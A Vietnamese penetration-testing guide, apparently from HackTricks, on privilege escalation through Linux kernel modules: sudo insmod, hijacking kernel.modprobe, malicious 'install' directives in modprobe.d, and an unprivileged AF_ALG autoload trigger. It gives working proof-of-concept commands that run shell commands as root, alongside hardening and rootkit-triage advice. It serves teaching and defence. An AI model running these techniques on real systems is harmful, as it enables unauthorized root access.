# Lạm dụng Kernel Modules và modprobe

{{#include ../../banners/hacktricks-training.md}}

## Cấu hình sai về kernel module và tải module

Hỗ trợ kernel module là một khu vực có tác động lớn khi rà soát khả năng leo thang đặc quyền trên Linux. Đừng xem mọi thông báo về module chưa ký là dấu hiệu có thể khai thác; thay vào đó, hãy dùng chúng để trả lời các câu hỏi thực tế.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Người dùng hiện tại có thể tải module thông qua `sudo`, capabilities hoặc đường dẫn helper có quyền ghi không?
- Tính năng tải module còn được bật không?
- Cơ chế thực thi chữ ký module có bị tắt không?
- Các thư mục module, tệp module hoặc đường dẫn cấu hình `modprobe.d` có quyền ghi không?<sup>[[16]](#references)</sup>
- Có thể đọc nhật ký kernel để xác nhận điều gì đã xảy ra không?

Quy trình phân loại nhanh bắt đầu bằng các bước kiểm tra trạng thái module, chữ ký, ghi nhật ký và cây thư mục module sau đây.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Diễn giải:

- `modules_disabled=1` nghĩa là không thể tải hoặc gỡ module, và giá trị này không thể được đặt lại thành `0` cho đến khi khởi động lại.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` trên dòng lệnh kernel hoặc `CONFIG_MODULE_SIG_FORCE=y` yêu cầu các module phải được ký hợp lệ; nếu không, module chưa được ký vẫn có thể được tải và khiến kernel bị đánh dấu là đã tải module không đáng tin cậy.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` không áp đặt hạn chế nào với `dmesg`; khi giá trị là `1`, cần có `CAP_SYSLOG` để truy cập.<sup>[[1]](#references)</sup>
- Các đường dẫn có quyền ghi trong `/lib/modules/$(uname -r)/` rất nguy hiểm vì `modprobe` tìm kiếm trong cây thư mục đó và dữ liệu dependency của nó khi tải module.<sup>[[8]](#references)</sup>

### Tải module và đọc đầu ra của kernel

Nếu bạn có quyền hợp lệ để tải một module cục bộ, `insmod` sẽ chèn chính xác tệp `.ko` mà bạn cung cấp. Hàm init của module chạy trong quá trình tải, và các thông báo được ghi bằng `printk()` sẽ được gửi đến bộ đệm nhật ký kernel, thường được đọc bằng `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Quy trình kiểm tra tối thiểu sử dụng `modinfo` để xem metadata, `insmod` và `rmmod` để tải và gỡ module, `lsmod` để xác nhận trạng thái đã tải, và `dmesg` để kiểm tra nhật ký kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Nếu `sudo -l` cho phép chạy `insmod`, `modprobe` hoặc trình bao bọc chúng, hãy xem đây là vấn đề nghiêm trọng: `sudo -l` liệt kê các quyền của người dùng gọi lệnh, còn việc tải kernel module yêu cầu `CAP_SYS_MODULE`. Xem [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) để biết các đường dẫn trực tiếp dựa trên capability.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` được phép chạy bằng sudo

Một quy tắc sudo cho phép người dùng chạy `insmod` không tương đương với việc cho phép chạy một tiện ích quản trị thông thường. Mã khởi tạo của module chạy trong quá trình nạp module, vì vậy câu hỏi thực tế khi kiểm tra là liệu người dùng này có thể chọn hoặc sửa đổi module được nạp hay không.<sup>[[3]](#references)</sup>

Quy trình kiểm tra tổng quát sau đây lặp lại các bước kiểm tra, nạp, trạng thái, nhật ký và gỡ bỏ đối với một module cần xem xét.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Nếu người dùng có thể cung cấp một tệp `.ko` tùy ý, trong một cuộc đánh giá được ủy quyền, cần xem quy tắc này là khả năng xâm phạm toàn bộ hệ thống. Cách vận hành an toàn hơn là không ủy quyền tải module thông qua sudo; nếu không thể tránh, hãy giới hạn chính xác đường dẫn, quyền sở hữu, quyền truy cập, chính sách ký và quy trình gỡ bỏ.<sup>[[3]](#references)[[10]](#references)</sup>

Để xây dựng module vô hại trong một phòng lab được kiểm soát, bên dưới là mã nguồn tối giản và Makefile; dạng `make -C /lib/modules/$(uname -r)/build M=$PWD` tuân theo quy trình kbuild được kernel tài liệu hóa dành cho các module bên ngoài.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Chỉ build và nạp trong lab được cấp phép; kbuild build module bên ngoài, còn các lệnh nạp/gỡ gọi đến các interface của kernel module.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Kiểm tra hành vi lạm dụng `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` chỉ định helper userspace mà kernel thực thi khi có yêu cầu tự động tải module; sysctl này ảnh hưởng đến việc tự động tải, không ảnh hưởng đến thao tác chèn module tường minh. Nếu attacker có thể đổi giá trị này thành đường dẫn đến tệp thực thi có quyền ghi và kích hoạt yêu cầu tải module, helper đó sẽ trở thành một đường dẫn thực thi mã với đặc quyền cao. Đặt giá trị này thành chuỗi rỗng sẽ vô hiệu hóa các yêu cầu tự động tải; nếu `CONFIG_STATIC_USERMODEHELPER=y`, mọi giá trị không rỗng sẽ bị ghi đè bằng đường dẫn helper tĩnh được biên dịch sẵn.<sup>[[1]](#references)</sup>

Kiểm tra đường dẫn helper hiện tại thông qua giao diện sysctl của kernel, đồng thời kiểm tra chủ sở hữu và quyền truy cập của tệp đích.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Kiểm tra xem sysctl, các quy tắc sudo được ủy quyền hoặc file capabilities có thể bị chi phối hay không.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Mẫu chỉ dùng trong lab sau đây thay đổi đường dẫn helper và kích hoạt một yêu cầu tự động tải module đã được tài liệu hóa; chỉ sử dụng trên hệ thống biệt lập, được cấp phép.<sup>[[1]](#references)</sup>

Trên các kernel Linux hiện tại, không dùng một tệp thực thi không xác định làm cơ chế kích hoạt chung: tính năng tự động tải module cho định dạng nhị phân tùy chỉnh kiểu cũ đã bị loại bỏ trong Linux 6.14, trong khi tài liệu kernel xác định kiểu hệ thống tệp không xác định là một đường dẫn yêu cầu tự động tải module.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Trên các hệ thống được harden, thao tác này sẽ thất bại nếu quyền hạn ngăn người dùng không đặc quyền ghi vào `kernel.modprobe`, đường dẫn helper không cho phép ghi hoặc tính năng tự động tải module bị tắt.<sup>[[1]](#references)</sup>

### Trigger tự động tải AF_ALG không cần đặc quyền

Trigger filesystem ở trên sử dụng `mount` với đặc quyền.<sup>[[1]](#references)</sup> Nếu có socket AF_ALG, người gọi không có đặc quyền có thể thay vào đó bind một socket với một type cố ý không tồn tại.<sup>[[17]](#references)[[18]](#references)</sup> Sau đó, `alg_bind()` yêu cầu `algif-<type>` thông qua `request_module()`, lệnh này gọi module helper đã cấu hình.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Cách này vẫn hoạt động sau khi Linux 6.14 loại bỏ tính năng tự động tải định dạng binary không xác định kiểu cũ.<sup>[[11]](#references)[[17]](#references)</sup> `bind()` thất bại là điều dự kiến vì type đó không tồn tại; hãy kiểm tra tác động phụ của helper thay vì giá trị trả về của socket.<sup>[[17]](#references)[[18]](#references)</sup>

Trong lab được cấp phép, trước tiên hãy thiết lập helper hoặc quy tắc `modprobe.d` có kiểm soát, sau đó kích hoạt một yêu cầu mà không dùng `sudo` hoặc `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ chấp nhận tuple bind AF_ALG `(type, name)`.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Đường dẫn này yêu cầu một socket AF_ALG có thể sử dụng và `kernel.modprobe` không rỗng.<sup>[[1]](#references)[[18]](#references)</sup> Trên các kernel có `/proc/sys/crypto/af_alg_restrict`, giá trị `2` vô hiệu hóa việc tạo socket AF_ALG; giá trị `1` giới hạn các thuật toán nhưng không ngăn yêu cầu kiểu còn thiếu trong `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> LSM có thể từ chối yêu cầu nạp module trước khi helper được gọi.<sup>[[19]](#references)</sup>

### Cấu hình `modprobe.d` có thể ghi và `sudo modprobe -C`

Trước khi phân giải một module, `modprobe` đọc các tệp `.conf` từ những thư mục cấu hình như `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` và `/lib/modprobe.d`, theo thứ tự ưu tiên. Tệp cùng tên trong thư mục có độ ưu tiên cao hơn sẽ che khuất tệp ở thư mục có độ ưu tiên thấp hơn. Quan trọng hơn, chỉ thị `install <module> <command>` chạy một lệnh shell tùy ý **thay vì** chèn module đó. Vì vậy, đường dẫn cấu hình có thể ghi có thể trở thành điểm thực thi lệnh trì hoãn với thông tin xác thực của một tiến trình `modprobe` có đặc quyền được gọi sau đó; cơ chế thực thi chữ ký module của kernel không xác thực lệnh userspace này.<sup>[[16]](#references)</sup>

Kiểm tra quyền của thư mục và tệp, sau đó xem cấu hình có hiệu lực. `modprobe -n -v` an toàn để rà soát quá trình phân giải vì chế độ chạy thử không chèn module cũng không thực thi lệnh `install`/`remove`. Ưu tiên dùng `modprobe -c` thay cho cách viết cũ `--showconfig`, vốn được tài liệu kmod hiện tại đánh dấu sẽ bị loại bỏ sau kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Quy tắc sudo không hạn chế cho `modprobe` có thể bị khai thác ngay cả khi các tệp `.ko` tùy ý không vượt qua được bước xác minh chữ ký: `-C` chọn một thư mục cấu hình do kẻ tấn công kiểm soát, từ đó tiến trình được sudo khởi chạy có thể thực thi lệnh `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Nếu một thư mục `modprobe.d` mà helper của kernel có thể truy cập cho phép ghi, cùng [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) có thể chạy ngay chỉ thị `install algif-htprobe`, không cần chờ quản trị viên gọi `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> Trong môi trường lab được cấp phép, hãy đặt một lệnh đánh dấu vô hại trong tệp `.conf` cho phép ghi, xác nhận cách phân giải bằng `modprobe -n -v algif-htprobe`, rồi chạy trigger ở trên.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` và cơ chế thực thi chữ ký module chặn việc nạp module, chứ không chặn lệnh `install` trong userspace này; `kernel.modprobe` rỗng hoặc đường dẫn AF_ALG bị chặn sẽ ngăn tuyến autoload này.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Để giảm thiểu rủi ro, không cấp quyền chạy `modprobe` với đối số không hạn chế thông qua sudo, đảm bảo mọi thư mục cấu hình đều thuộc sở hữu của root và không thể ghi, đồng thời rà soát các chỉ thị `install`/`remove` bất thường. Khi một quy trình quản trị đáng tin cậy cần bỏ qua các chỉ thị như vậy cho một module, `modprobe --ignore-install` sẽ bỏ qua chúng đối với module được chỉ định, nhưng các dependency vẫn có thể có lệnh riêng.<sup>[[8]](#references)[[16]](#references)</sup>

### Rà soát `/lib/modules` có quyền ghi

Các thư mục module có quyền ghi có thể cho phép thay thế module, cài cắm module độc hại hoặc lạm dụng cơ chế tự động tải, tùy thuộc vào cách `modprobe` được gọi sau đó; `modprobe` tìm kiếm trong `/lib/modules/$(uname -r)` và sử dụng dữ liệu dependency tại đó khi phân giải module.<sup>[[8]](#references)</sup>

Rà soát các tệp module có quyền ghi cùng metadata dependency/alias trong cây module của bản phát hành kernel đang hoạt động.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Nếu phát hiện nội dung module có thể ghi, hãy kiểm tra cách `modprobe` phân giải các phần phụ thuộc và cách `modinfo` báo cáo siêu dữ liệu của module.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Ghi chú phòng thủ:

- Đảm bảo `/lib/modules` thuộc sở hữu của `root:root` và người dùng không có quyền ghi.<sup>[[8]](#references)</sup>
- Đặt `kernel.modules_disabled=1` sau khi khởi động nếu có thể thực hiện được về mặt vận hành.<sup>[[1]](#references)</sup>
- Bắt buộc ký module trên các hệ thống cần nạp module.<sup>[[2]](#references)</sup>
- Giám sát các lần ghi vào `/proc/sys/kernel/modprobe`, `/lib/modules` và các thư mục cấu hình `modprobe.d`, cũng như việc thực thi `insmod`/`modprobe` bất thường.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Phân loại rootkit dựa trên module

Module độc hại có thể hook syscall, các chế độ hiển thị của VFS hoặc `/proc`, đường dẫn mạng hoặc các bước kiểm tra thông tin xác thực để ẩn tiến trình và tệp, chuyển hướng lưu lượng hoặc chặn lấy bí mật. Nó cũng có thể tự xóa khỏi danh sách module do `lsmod` hiển thị. Cơ chế duy trì có thể đến từ alias hoặc quy tắc install trong `modprobe.d`, `/etc/modules-load.d`, một systemd unit, nội dung initramfs hoặc việc thay thế tệp `.ko` hợp lệ. Kết quả `lsmod` bình thường là bằng chứng hữu ích, nhưng việc kernel bị xâm phạm có thể khiến các danh sách do kernel cung cấp trở nên không đáng tin cậy. Hãy đối chiếu các module đã nạp, tệp trên đĩa, cấu hình khởi động, nhật ký nạp module và telemetry bên ngoài đáng tin cậy.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Rà soát các tên module, đường dẫn, dependency, chữ ký và thời điểm tải bất thường. Các thông báo về kernel taint và module chưa ký là manh mối, không phải bằng chứng về rootkit. Nếu nghi ngờ có rootkit, hãy thu thập bằng chứng từ image đáng tin cậy hoặc môi trường khôi phục trước khi dựa vào đầu ra kernel trực tiếp. Trang [đánh giá lỗ hổng kernel](kernel-vulnerability-assessment.md) đề cập đến cấu hình và các điểm có thể lộ thông tin chẩn đoán, bao gồm tracefs và các đối tượng BPF được ghim.



## References

- [1] [Tài liệu về /proc/sys/kernel/ — Tài liệu Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Cơ chế ký module kernel — Tài liệu Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Các kiến thức cơ bản về driver — Tài liệu Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Ghi log thông báo bằng printk — Tài liệu Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Xây dựng module bên ngoài — Tài liệu Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Hợp nhất thẻ 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Khôi phục kỹ thuật modprobe_path: Vượt qua bản vá search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [Liên kết AF_ALG và yêu cầu module — Mã nguồn Linux kernel](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Lời gọi module helper — Mã nguồn Linux kernel](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Tài liệu Python](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Tài liệu Linux kernel](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
